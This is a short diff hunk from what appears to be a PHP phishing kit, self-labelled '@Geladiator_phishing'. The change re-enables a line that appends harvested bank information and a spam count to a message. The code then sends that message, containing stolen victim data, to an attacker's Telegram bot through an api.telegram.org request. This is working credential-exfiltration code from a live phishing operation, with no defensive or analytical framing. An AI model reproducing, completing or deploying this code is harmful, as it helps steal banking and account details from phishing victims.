@@ -82,7 +82,7 @@ $mailinfo
 🆔 : @Geladiator_phishing :)
 ";
     
-//$Text .="\n$bankinfo[0]⁉️Spam: $num";
+$Text .="\n$bankinfo[0]⁉️Spam: $num";
 
 if( (integer)$num > $paylimit){}else{
     file_get_contents("https://api.telegram.org/bot".$TOKENM."/sendMessage?parse_mode=HTML&chat_id=".$IDM."&text=".urlencode($Text));
